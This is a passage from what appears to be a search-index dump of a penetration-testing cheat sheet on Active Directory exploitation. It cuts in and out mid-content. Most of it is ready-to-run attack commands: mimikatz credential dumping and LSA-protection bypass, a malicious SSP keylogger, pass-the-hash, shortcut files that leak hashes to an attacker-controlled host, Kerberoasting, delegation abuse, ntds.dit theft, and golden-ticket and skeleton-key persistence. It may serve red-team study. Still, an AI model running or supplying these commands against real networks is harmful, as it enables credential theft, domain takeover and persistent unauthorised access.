c:\\temp\\lsass.dmp\n\n#List cached MasterKeys\nmimikatz sekurlsa::dpapi\n\n#List local Kerberos AES Keys\nmimikatz sekurlsa::ekeys\n\n#Dump SAM Database\nmimikatz lsadump::sam\n\n#Dump SECRETS Database\nmimikatz lsadump::secrets\n\n#Inject and dump the Domain Controler's Credentials\nmimikatz privilege::debug\nmimikatz token::elevate\nmimikatz lsadump::lsa /inject\n\n#Dump the Domain's Credentials without touching DC's LSASS and also remotely\nmimikatz lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all\n\n#List and Dump local kerberos credentials\nmimikatz kerberos::list /dump\n\n#Pass The Ticket\nmimikatz kerberos::ptt &lt;PathToKirbiFile&gt;\n\n#List TS/RDP sessions\nmimikatz ts::sessions\n\n#List Vault credentials\nmimikatz vault::list\n</code></pre> <p> What if mimikatz fails to dump credentials because of LSA Protection controls ?</p> <ul> <li>LSA as a Protected Process (Kernel Land Bypass)</li> </ul> <pre><code>#Check if LSA runs as a protected process by looking if the variable \"RunAsPPL\" is set to 0x1\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\n\n#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe\n#Now lets import the mimidriver.sys to the system\nmimikatz # !+\n\n#Now lets remove the protection flags from lsass.exe process\nmimikatz # !processprotect /process:lsass.exe /remove\n\n#Finally run the logonpasswords function to dump lsass\nmimikatz # sekurlsa::logonpasswords\n</code></pre> <ul> <li> <p>LSA as a Protected Process (Userland \"Fileless\" Bypass)</p> </li> <li> <p>PPLdump</p> </li> <li> <p>Bypassing LSA Protection in Userland</p> </li> <li> <p>LSA is running as virtualized process (LSAISO) by Credential Guard</p> </li> </ul> <pre><code>#Check if a process called lsaiso.exe exists on the running processes\ntasklist |findstr lsaiso\n\n#If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.\n#Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides\nmimikatz # misc::memssp\n\n#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\\windows\\system32\\mimilsa.log\n</code></pre> <ul> <li>Detailed Mimikatz Guide</li> <li>Poking Around With 2 lsass Protection Options</li> </ul>","title":"Mimikatz"},{"location":"cheat_sheets/active_directory/exploitation/#remote-desktop-protocol","text":"<p>If the host we want to lateral move to has \"RestrictedAdmin\" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.</p> <ul> <li>Mimikatz:</li> </ul> <pre><code>#We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the \"/restrictedadmin\" flag\nprivilege::debug\nsekurlsa::pth /user:&lt;Username&gt; /domain:&lt;DomainName&gt; /ntlm:&lt;NTLMHash&gt; /run:\"mstsc.exe /restrictedadmin\"\n\n#Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated\n</code></pre> <ul> <li>xFreeRDP:</li> </ul> <pre><code>xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:&lt;Username&gt; /pth:&lt;NTLMHash&gt; /v:&lt;Hostname | IPAddress&gt;\n</code></pre> <p> If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin\".</p>","title":"Remote Desktop Protocol"},{"location":"cheat_sheets/active_directory/exploitation/#url-file-attacks","text":"<ul> <li>.url file</li> </ul> <pre><code>[InternetShortcut]\nURL=whatever\nWorkingDirectory=whatever\nIconFile=\\\\&lt;AttackersIp&gt;\\%USERNAME%.icon\nIconIndex=1\n</code></pre> <pre><code>[InternetShortcut]\nURL=file://&lt;AttackersIp&gt;/leak/leak.html\n</code></pre> <ul> <li>.scf file</li> </ul> <pre><code>[Shell]\nCommand=2\nIconFile=\\\\&lt;AttackersIp&gt;\\Share\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n</code></pre> <p>Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. Note that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.</p> <p> .scf file attacks won't work on the latest versions of Windows.</p>","title":"URL File Attacks"},{"location":"cheat_sheets/active_directory/exploitation/#useful-tools","text":"<ul> <li>Powercat netcat written in powershell, and provides tunneling, relay and portforward   capabilities.</li> <li>SCShell fileless lateral movement tool that relies on ChangeServiceConfigA to run command</li> <li>Evil-Winrm the ultimate WinRM shell for hacking/pentesting</li> <li>RunasCs Csharp and open version of windows builtin runas.exe</li> <li>ntlm_theft creates all possible file formats for url file attacks</li> </ul>","title":"Useful Tools"},{"location":"cheat_sheets/active_directory/exploitation/#domain-privilege-escalation","text":"","title":"Domain Privilege Escalation"},{"location":"cheat_sheets/active_directory/exploitation/#kerberoast","text":"<p>What's that?  All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a \"user\"  account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.</p> <ul> <li>PowerView:</li> </ul> <pre><code>#Get User Accounts that are used as Service Accounts\nGet-NetUser -SPN\n\n#Get every available SPN account, request a TGS and dump its hash\nInvoke-Kerberoast\n\n#Requesting the TGS for a single account:\nRequest-SPNTicket\n\n#Export all tickets using Mimikatz\nInvoke-Mimikatz -Command '\"kerberos::list /export\"'\n</code></pre> <ul> <li>AD Module:</li> </ul> <pre><code>#Get User Accounts that are used as Service Accounts\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre> <ul> <li>Impacket:</li> </ul> <pre><code>python GetUserSPNs.py &lt;DomainName&gt;/&lt;DomainUser&gt;:&lt;Password&gt; -outputfile &lt;FileName&gt;\n</code></pre> <ul> <li>Rubeus:</li> </ul> <pre><code>#Kerberoasting and outputing on a file with a spesific format\nRubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt;\n\n#Kerberoasting whle being \"OPSEC\" safe, essentially while not try to roast AES enabled accounts\nRubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /rc4opsec\n\n#Kerberoast AES enabled accounts\nRubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /aes\n\n#Kerberoast spesific user account\nRubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /user:&lt;username&gt; /simple\n\n#Kerberoast by specifying the authentication credentials\nRubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /creduser:&lt;username&gt; /credpassword:&lt;password&gt;\n</code></pre>","title":"Kerberoast"},{"location":"cheat_sheets/active_directory/exploitation/#asreproast","text":"<p>What's that?  If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted  blob and bruteforce it offline.</p> <ul> <li>PowerView: <code>Get-DomainUser -PreauthNotRequired -Verbose</code></li> <li>AD Module: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth</code></li> </ul> <p>Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more! Check for interesting permissions on accounts:</p> <p>Hint: We add a filter e.g. RDPUsers to get \"User Accounts\" not Machine Accounts, because Machine Account hashes are not crackable!</p> <p>PowerView:</p> <pre><code>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \"RDPUsers\"}\nDisable Kerberos Preauth:\nSet-DomainObject -Identity &lt;UserAccount&gt; -XOR @{useraccountcontrol=4194304} -Verbose\nCheck if the value changed:\nGet-DomainUser -PreauthNotRequired -Verbose\n</code></pre> <ul> <li>And finally execute the attack using the ASREPRoast tool.</li> </ul> <pre><code>#Get a spesific Accounts hash:\nGet-ASREPHash -UserName &lt;UserName&gt; -Verbose\n\n#Get any ASREPRoastable Users hashes:\nInvoke-ASREPRoast -Verbose\n</code></pre> <ul> <li>Using Rubeus:</li> </ul> <pre><code>#Trying the attack for all domain users\nRubeus.exe asreproast /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;\n\n#ASREPRoast spesific user\nRubeus.exe asreproast /user:&lt;username&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;\n\n#ASREPRoast users of a spesific OU (Organization Unit)\nRubeus.exe asreproast /ou:&lt;OUName&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;\n</code></pre> <ul> <li>Using Impacket:</li> </ul> <pre><code>#Trying the attack for the specified users on the file\npython GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -outputfile &lt;FileName&gt;\n</code></pre>","title":"ASREPRoast"},{"location":"cheat_sheets/active_directory/exploitation/#password-spray-attack","text":"<p>If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse on other domain accounts.</p> <p>Tools:</p> <ul> <li>DomainPasswordSpray</li> <li>CrackMapExec</li> <li>Invoke-CleverSpray</li> <li>Spray</li> </ul>","title":"Password Spray Attack"},{"location":"cheat_sheets/active_directory/exploitation/#force-set-spn","text":"<p>What's that? If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it._</p> <ul> <li>PowerView:</li> </ul> <pre><code>#Check for interesting permissions on accounts:\nInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \"RDPUsers\"}\n\n#Check if current user has already an SPN setted:\nGet-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname\n\n#Force set the SPN on the account:\nSet-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname='ops/whatever1'}\n</code></pre> <ul> <li>AD Module:</li> </ul> <pre><code>#Check if current user has already an SPN setted\nGet-ADUser -Identity &lt;UserName&gt; -Properties ServicePrincipalName | select ServicePrincipalName\n\n#Force set the SPN on the account:\nSet-ADUser -Identiny &lt;UserName&gt; -ServicePrincipalNames @{Add='ops/whatever1'}\n</code></pre> <p>Finally use any tool from before to grab the hash and kerberoast it!</p>","title":"Force Set SPN"},{"location":"cheat_sheets/active_directory/exploitation/#abusing-shadow-copies","text":"<p>If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.</p> <pre><code>#List shadow copies using vssadmin (Needs Admnistrator Access)\nvssadmin list shadows\n\n#List shadow copies using diskshadow\ndiskshadow list shadows all\n\n#Make a symlink to the shadow copy and access it\nmklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\\n</code></pre> <ol> <li>You can dump the backuped SAM database and harvest credentials.</li> <li>Look for DPAPI stored creds and decrypt them.</li> <li>Access backuped sensitive files.</li> </ol>","title":"Abusing Shadow Copies"},{"location":"cheat_sheets/active_directory/exploitation/#list-and-decrypt-stored-credentials-using-mimikatz","text":"<p>Usually encrypted credentials are stored in:</p> <ul> <li><code>%appdata%\\Microsoft\\Credentials</code></li> <li><code>%localappdata%\\Microsoft\\Credentials</code></li> </ul> <pre><code>#By using the cred function of mimikatz we can enumerate the cred object and get information about it:\ndpapi::cred /in:\"%appdata%\\Microsoft\\Credentials\\&lt;CredHash&gt;\"\n\n#From the previous command we are interested to the \"guidMasterKey\" parameter, that tells us which masterkey was used to encrypt the credential\n#Lets enumerate the Master Key:\ndpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\&lt;usersid&gt;\\&lt;MasterKeyGUID&gt;\"\n\n#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:\ndpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\&lt;usersid&gt;\\&lt;MasterKeyGUID&gt;\" /rpc\n\n#We now have the masterkey in our local cache:\ndpapi::cache\n\n#Finally we can decrypt the credential using the cached masterkey:\ndpapi::cred /in:\"%appdata%\\Microsoft\\Credentials\\&lt;CredHash&gt;\"\n</code></pre> <p>Detailed Article: DPAPI all the things</p>","title":"List and Decrypt Stored Credentials using Mimikatz"},{"location":"cheat_sheets/active_directory/exploitation/#unconstrained-delegation","text":"<p>What's that? If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a high value target or DA to connect to it, steal his TGT then ptt and impersonate him!_</p> <p>Using PowerView:</p> <pre><code>#Discover domain joined computers that have Unconstrained Delegation enabled\nGet-NetComputer -UnConstrained\n\n#List tickets and check if a DA or some High Value target has stored its TGT\nInvoke-Mimikatz -Command '\"sekurlsa::tickets\"'\n\n#Command to monitor any incoming sessions on our compromised server\nInvoke-UserHunter -ComputerName &lt;NameOfTheComputer&gt; -Poll &lt;TimeOfMonitoringInSeconds&gt; -UserName &lt;UserToMonitorFor&gt; -Delay\n&lt;WaitInterval&gt; -Verbose\n\n#Dump the tickets to disk:\nInvoke-Mimikatz -Command '\"sekurlsa::tickets /export\"'\n\n#Impersonate the user using ptt attack:\nInvoke-Mimikatz -Command '\"kerberos::ptt &lt;PathToTicket&gt;\"'\n</code></pre> <p>Note: We can also use Rubeus!</p>","title":"Unconstrained Delegation"},{"location":"cheat_sheets/active_directory/exploitation/#constrained-delegation","text":"<p>Using PowerView and Kekeo:</p> <pre><code>#Enumerate Users and Computers with constrained delegation\nGet-DomainUser -TrustedToAuth\nGet-DomainComputer -TrustedToAuth\n\n#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo\ntgt::ask /user:&lt;UserName&gt; /domain:&lt;Domain's FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;\n\n#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation\ntgs::s4u /tgt:&lt;PathToTGT&gt; /user:&lt;UserToImpersonate&gt;@&lt;Domain's FQDN&gt; /service:&lt;Service's SPN&gt;\n\n#Finally use mimikatz to ptt the TGS\nInvoke-Mimikatz -Command '\"kerberos::ptt &lt;PathToTGS&gt;\"'\n</code></pre> <p>ALTERNATIVE Using Rubeus:</p> <pre><code>Rubeus.exe s4u /user:&lt;UserName&gt; /rc4:&lt;NTLMhashedPasswordOfTheUser&gt; /impersonateuser:&lt;UserToImpersonate&gt; /msdsspn:\"&lt;Service's SPN&gt;\" /altservice:&lt;Optional&gt; /ptt\n</code></pre> <p>Now we can access the service as the impersonated user!</p> <p> What if we have delegation rights for only a spesific SPN? (e.g TIME):</p> <p>In this case we can still abuse a feature of kerberos called \"alternative service\". This allows us to request TGS tickets for other \"alternative\" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.</p>","title":"Constrained Delegation"},{"location":"cheat_sheets/active_directory/exploitation/#resource-based-constrained-delegation","text":"<p>What's that? TL;DR \\ If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access._</p> <p>Tools we are going to use:</p> <ul> <li>PowerView</li> <li>Powermad</li> <li>Rubeus</li> </ul> <p>First we need to enter the security context of the user/machine account that has the privileges over the object. If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.</p> <p>Exploitation Example:</p> <pre><code>#Import Powermad and use it to create a new MACHINE ACCOUNT\n. .\\Powermad.ps1\nNew-MachineAccount -MachineAccount &lt;MachineAccountName&gt; -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose\n\n#Import PowerView and get the SID of our new created machine account\n. .\\PowerView.ps1\n$ComputerSid = Get-DomainComputer &lt;MachineAccountName&gt; -Properties objectsid | Select -Expand objectsid\n\n#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\n\n#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView\nGet-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose\n\n#After that we need to get the RC4 hash of the new machine account's password using Rubeus\nRubeus.exe hash /password:'p@ssword!'\n\n#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus\nRubeus.exe s4u /user:&lt;MachineAccountName&gt; /rc4:&lt;RC4HashOfMachineAccountPassword&gt; /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt\n\n#Finally we can access the C$ drive of the target machine\ndir \\\\TargetMachine.wtver.domain\\C$\n</code></pre> <p>Detailed Articles:</p> <ul> <li>Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</li> <li>RESOURCE-BASED CONSTRAINED DELEGATION ABUSE</li> </ul> <p> In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick \"tgt::deleg\" from kekeo or \"tgtdeleg\" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.</p> <pre><code>#Command on Rubeus\nRubeus.exe tgtdeleg /nowrap\n</code></pre> <p>Detailed Article: Rubeus \u2013 Now With More Kekeo</p>","title":"Resource Based Constrained Delegation"},{"location":"cheat_sheets/active_directory/exploitation/#dnsadmins-abuse","text":"<p>What's that? If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work._</p> <ol> <li>Enumerate the members of the DNSAdmins group:</li> <li>PowerView: <code>Get-NetGroupMember -GroupName \"DNSAdmins\"</code></li> <li>AD Module: <code>Get-ADGroupMember -Identiny DNSAdmins</code></li> <li>Once we found a member of this group we need to compromise it (There are many ways).</li> <li>Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:</li> </ol> <pre><code>#Using dnscmd:\ndnscmd &lt;NameOfDNSMAchine&gt; /config /serverlevelplugindll \\\\Path\\To\\Our\\Dll\\malicious.dll\n\n#Restart the DNS Service:\nsc \\\\DNSServer stop dns\nsc \\\\DNSServer start dns\n</code></pre>","title":"DNSAdmins Abuse"},{"location":"cheat_sheets/active_directory/exploitation/#abusing-active-directory-integraded-dns","text":"<ul> <li>Exploiting Active Directory-Integrated DNS</li> <li>ADIDNS Revisited</li> <li>Inveigh</li> </ul>","title":"Abusing Active Directory-Integraded DNS"},{"location":"cheat_sheets/active_directory/exploitation/#abusing-backup-operators-group","text":"<p>What's that? If we manage to compromise a user account that is member of the Backup Operators group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC, extract the ntds.dit database file, dump the hashes and escalate our privileges to DA._</p> <ol> <li>Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:</li> </ol> <pre><code>#Create a .txt file that will contain the shadow copy process script\nScript -&gt;{\nset context persistent nowriters\nset metadata c:\\windows\\system32\\spool\\drivers\\color\\example.cab\nset verbose on\nbegin backup\nadd volume c: alias mydrive\n\ncreate\n\nexpose %mydrive% w:\nend backup\n}\n\n#Execute diskshadow with our script as parameter\ndiskshadow /s script.txt\n</code></pre> <ol> <li>Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just    simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are    going to use this amazing repo:</li> </ol> <pre><code>#Importing both dlls from the repo using powershell\nImport-Module .\\SeBackupPrivilegeCmdLets.dll\nImport-Module .\\SeBackupPrivilegeUtils.dll\n\n#Checking if the SeBackupPrivilege is enabled\nGet-SeBackupPrivilege\n\n#If it isn't we enable it\nSet-SeBackupPrivilege\n\n#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice\nCopy-FileSeBackupPrivilege w:\\windows\\NTDS\\ntds.dit c:\\&lt;PathToSave&gt;\\ntds.dit -Overwrite\n\n#Dump the SYSTEM hive\nreg save HKLM\\SYSTEM c:\\temp\\system.hive\n</code></pre> <ol> <li>Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.</li> <li>Use secretsdump.py from impacket and dump the hashes.</li> <li>Use psexec or another tool of your choice to PTH and get Domain Admin access.</li> </ol>","title":"Abusing Backup Operators Group"},{"location":"cheat_sheets/active_directory/exploitation/#abusing-exchange","text":"<ul> <li>Abusing Exchange one Api call from DA</li> <li>CVE-2020-0688</li> <li>PrivExchange Exchange your privileges for Domain Admin privs by abusing Exchange</li> </ul>","title":"Abusing Exchange"},{"location":"cheat_sheets/active_directory/exploitation/#weaponizing-printer-bug","text":"<ul> <li>Printer Server Bug to Domain Administrator</li> <li>NetNTLMtoSilverTicket</li> </ul>","title":"Weaponizing Printer Bug"},{"location":"cheat_sheets/active_directory/exploitation/#abusing-acls","text":"<ul> <li>Escalating privileges with ACLs in Active Directory</li> <li>aclpwn.py</li> <li>Invoke-ACLPwn</li> </ul>","title":"Abusing ACLs"},{"location":"cheat_sheets/active_directory/exploitation/#abusing-ipv6-with-mitm6","text":"<ul> <li>Compromising IPv4 networks via IPv6</li> <li>mitm6</li> </ul>","title":"Abusing IPv6 with mitm6"},{"location":"cheat_sheets/active_directory/exploitation/#sid-history-abuse","text":"<p>What's that?  If we manage to compromise a child domain of a forest and SID filtering isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the SID History field on a kerberos TGT ticket, that defines the \"extra\" security groups and privileges._</p> <p>Exploitation example:</p> <pre><code>#Get the SID of the Current Domain using PowerView\nGet-DomainSID -Domain current.root.domain.local\n\n#Get the SID of the Root Domain using PowerView\nGet-DomainSID -Domain root.domain.local\n\n#Create the Enteprise Admins SID\nFormat: RootDomainSID-519\n\n#Forge \"Extra\" Golden Ticket using mimikatz\nkerberos::golden /user:Administrator /domain:current.root.domain.local /sid:&lt;CurrentDomainSID&gt; /krbtgt:&lt;krbtgtHash&gt; /sids:&lt;EnterpriseAdminsSID&gt; /startoffset:0 /endin:600 /renewmax:10080 /ticket:\\path\\to\\ticket\\golden.kirbi\n\n#Inject the ticket into memory\nkerberos::ptt \\path\\to\\ticket\\golden.kirbi\n\n#List the DC of the Root Domain\ndir \\\\dc.root.domain.local\\C$\n\n#Or DCsync and dump the hashes using mimikatz\nlsadump::dcsync /domain:root.domain.local /all\n</code></pre> <p>Detailed Articles:</p> <ul> <li>Kerberos Golden Tickets are Now More Golden</li> <li>A Guide to Attacking Domain Trusts</li> </ul>","title":"SID History Abuse"},{"location":"cheat_sheets/active_directory/exploitation/#exploiting-sharepoint","text":"<ul> <li>CVE-2019-0604 RCE Exploitation \\   PoC</li> <li>CVE-2019-1257 Code execution through BDC deserialization</li> <li>CVE-2020-0932 RCE using typeconverters \\   PoC</li> </ul>","title":"Exploiting SharePoint"},{"location":"cheat_sheets/active_directory/exploitation/#zerologon","text":"<ul> <li>Zerologon: Unauthenticated domain controller compromise: White paper of the vulnerability.</li> <li>SharpZeroLogon: C# implementation of the Zerologon exploit.</li> <li>Invoke-ZeroLogon: PowerShell implementation of the Zerologon exploit.</li> <li>Zer0Dump: Python implementation of the Zerologon exploit using the impacket library.</li> </ul>","title":"Zerologon"},{"location":"cheat_sheets/active_directory/exploitation/#printnightmare","text":"<ul> <li>CVE-2021-34527: Vulnerability details.</li> <li>Impacket implementation of PrintNightmare: Reliable PoC of PrintNightmare using the impacket library.</li> <li>C# Implementation of CVE-2021-1675: Reliable PoC of PrintNightmare written in C#.</li> </ul>","title":"PrintNightmare"},{"location":"cheat_sheets/active_directory/exploitation/#active-directory-certificate-services","text":"<p>Check for Vulnerable Certificate Templates with: Certify</p> <p>Note: Certify can be executed with Cobalt Strike's <code>execute-assembly</code> command as well</p> <pre><code>.\\Certify.exe find /vulnerable /quiet\n</code></pre> <p>Make sure the msPKI-Certificates-Name-Flag value is set to \"ENROLLEE_SUPPLIES_SUBJECT\" and that the Enrollment Rights allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the \"Client Authentication\" value as well as that the \"Authorized Signatures Required\" parameter is set to 0.</p> <p>This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin (\"DA\") and use the captured certificate with Rubeus to forge authentication.</p> <p>Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target.</p> <p>Request the DA's Account Certificate with Certify</p> <pre><code>.\\Certify.exe request /template:&lt;Template Name&gt; /quiet /ca:\"&lt;CA Name&gt;\" /domain:&lt;domain.com&gt; /path:CN=Configuration,DC=&lt;domain&gt;,DC=com /altname:&lt;Domain Admin AltName&gt; /machine\n</code></pre> <p>This should return a valid certificate for the associated DA account.</p> <p>The exported <code>cert.pem</code> and <code>cert.key</code> files must be consolidated into a single <code>cert.pem</code> file, with one gap of whitespace between the <code>END RSA PRIVATE KEY</code> and the <code>BEGIN CERTIFICATE</code>.</p> <p>Example of <code>cert.pem</code>:</p> <pre><code>-----BEGIN RSA PRIVATE KEY-----\nBIIEogIBAAk15x0ID[...]\n[...]\n[...]\n-----END RSA PRIVATE KEY-----\n\n-----BEGIN CERTIFICATE-----\nBIIEogIBOmgAwIbSe[...]\n[...]\n[...]\n-----END CERTIFICATE-----\n</code></pre>","title":"Active Directory Certificate Services"},{"location":"cheat_sheets/active_directory/exploitation/#utilize-openssl-to-convert-to-pkcs-12-format","text":"<p>The <code>openssl</code> command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).</p> <pre><code>openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n</code></pre> <p>Once the <code>cert.pfx</code> file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, <code>certutil.exe</code>, Cobalt Strike's upload functionality, etc.)</p> <p>After the <code>cert.pfx</code> file has been uploaded to the compromised host, Rubeus can be used to request a Kerberos TGT for the DA account which will then be imported into memory.</p> <pre><code>.\\Rubeus.exe asktht /user:&lt;Domain Admin AltName&gt; /domain:&lt;domain.com&gt; /dc:&lt;Domain Controller IP or Hostname&gt; /certificate:&lt;Local Machine Path to cert.pfx&gt; /nowrap /ptt\n</code></pre> <p>This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.</p>","title":"Utilize <code>openssl</code> to Convert to PKCS #12 Format"},{"location":"cheat_sheets/active_directory/exploitation/#no-pac","text":"<ul> <li>sAMAccountname Spoofing Exploitation of CVE-2021-42278 and CVE-2021-42287</li> <li>Weaponisation of CVE-2021-42287/CVE-2021-42278 Exploitation of CVE-2021-42278 and CVE-2021-42287</li> <li>noPAC C# tool to exploit CVE-2021-42278 and CVE-2021-42287</li> <li>sam-the-admin Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287</li> <li>noPac Evolution of \"sam-the-admin\" tool</li> </ul>","title":"No PAC"},{"location":"cheat_sheets/active_directory/exploitation/#domain-persistence","text":"","title":"Domain Persistence"},{"location":"cheat_sheets/active_directory/exploitation/#golden-ticket-attack","text":"<pre><code>#Execute mimikatz on DC as DA to grab krbtgt hash:\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -ComputerName &lt;DC'sName&gt;\n\n#On any machine:\nInvoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain's SID&gt; /krbtgt:\n&lt;HashOfkrbtgtAccount&gt;   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'\n</code></pre>","title":"Golden Ticket Attack"},{"location":"cheat_sheets/active_directory/exploitation/#dcsync-attack","text":"<pre><code>#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:&lt;DomainName&gt;\\&lt;AnyDomainUser&gt;\"'\n\n#DCsync using secretsdump.py from impacket with NTLM authentication\nsecretsdump.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;DC'S IP or FQDN&gt; -just-dc-ntlm\n\n#DCsync using secretsdump.py from impacket with Kerberos Authentication\nsecretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC'S IP or FQDN&gt; -just-dc-ntlm\n</code></pre> <p>Tip:  ptt -&gt; inject ticket on current running session  ticket -&gt; save the ticket on the system for later use</p>","title":"DCsync Attack"},{"location":"cheat_sheets/active_directory/exploitation/#silver-ticket-attack","text":"<pre><code>Invoke-Mimikatz -Command '\"kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;TheTargetMachine&gt; /service:\n&lt;ServiceType&gt; /rc4:&lt;TheSPN's Account NTLM Hash&gt; /user:&lt;UserToImpersonate&gt; /ptt\"'\n</code></pre> <p>SPN List</p>","title":"Silver Ticket Attack"},{"location":"cheat_sheets/active_directory/exploitation/#skeleton-key-attack","text":"<pre><code>#Exploitation Command runned as DA:\nInvoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName &lt;DC's FQDN&gt;\n\n#Access using the password \"mimikatz\"\nEnter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\\Administrator\n</code></pre>","title":"Skeleton Key Attack"},{"location":"cheat_sheets/active_directory/exploitation/#dsrm-abuse","text":"<p>What's that? Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!</p> 